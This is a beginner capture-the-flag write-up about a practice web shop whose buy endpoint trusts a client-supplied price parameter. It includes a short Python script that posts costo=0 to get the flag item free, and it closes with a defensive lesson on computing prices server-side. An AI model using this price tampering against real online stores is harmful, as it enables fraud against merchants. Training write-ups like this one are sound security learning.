---
title: "Flags Shop — Price Parameter Tampering"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "logic-bypass", "python"]
difficulty: "beginner"
summary: "The buy endpoint accepts a 'costo' (price) POST parameter from the client. Sending costo=0 purchases the expensive flag item for free."
---

## The Challenge

An online shop. The flag item costs more than your balance. The purchase request includes both the item ID and the price as POST parameters.

## Approach

If the server calculates `balance -= costo` trusting the client-supplied `costo`, sending `costo=0` means the transaction costs nothing. The item gets dispensed and the flag is returned.

## Solution

```python
import requests
site = "http://shops.challs.olicyber.it/buy.php"
r = requests.post(site, data={"id":"2", "costo":"0"})
print(r.text, end="")
```

Two POST parameters: `id=2` selects the flag item, `costo=0` sets the price to zero. The server trusts both and returns the purchased item — the flag.

## What I Learned

Prices and quantities must always be computed server-side from a trusted product catalogue, never accepted from the client. Any parameter that affects a financial calculation and originates from the client is a business logic vulnerability.
